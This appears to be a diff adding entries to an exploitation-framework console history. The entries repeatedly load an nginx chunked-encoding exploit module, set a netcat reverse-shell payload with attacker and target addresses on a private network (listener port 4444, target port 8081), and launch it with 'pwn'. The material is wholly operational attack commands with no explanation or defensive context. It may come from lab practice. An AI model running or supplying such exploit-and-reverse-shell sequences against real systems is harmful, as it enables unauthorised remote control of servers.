@@ -43,3 +43,62 @@ load linux_x64_ovrflwmyechosrv
 show author
 show name
 load linux_x64_nginx_chunked
+set PAYLOAD reverse/linux_netcat
+set lhost 192.168.1.84
+set rhost 192.168.1.52
+set lport 4444
+set rport 8081
+pwn
+load linux_x64_nginx_chunked
+set PAYLOAD reverse/linux_netcat
+set lhost 192.168.1.84
+set rhost 192.168.1.52
+set lport 4444
+set rport 8081
+pwn
+load linux_x64_nginx_chunked
+set lhost 192.168.1.84
+set rhost 192.168.1.52
+set lport 4444
+set rport 8081
+pwn
+set PAYLOAD reverse/linux_netcat
+pwn
+load linux_x64_nginx_chunked
+set PAYLOAD reverse/linux_netcat
+set lhost 192.168.1.84
+set rhost 192.168.1.52
+set rport 8081
+set lport 4444
+pwn
+set rhost 192.168.1.52
+load linux_x64_nginx_chunked
+set rhost 192.168.1.52
+set lhost 192.168.1.84
+set rport 8081
+set lport 4444
+pwn
+set PAYLOAD reverse/linux_netcat
+pwn
+set PAYLOAD reverse/linux_netcat
+load linux_x64_nginx_chunked
+set PAYLOAD reverse/linux_netcat
+set lhost 192.168.1.84
+set lport 4444
+set rhost 192.168.1.52
+set rport 8081
+pwn
+load linux_x64_nginx_chunked
+set PAYLOAD reverse/linux_netcat
+set rhost 192.168.1.52
+set rport 8081
+set lhost 192.168.1.84
+set lport 4444
+pwn
+load linux_x64_nginx_chunked
+set PAYLOAD reverse/linux_netcat
+set lhost 192.168.1.84
+set lport 4444
+set rhost 192.168.1.52
+set rport 8081
+pwn
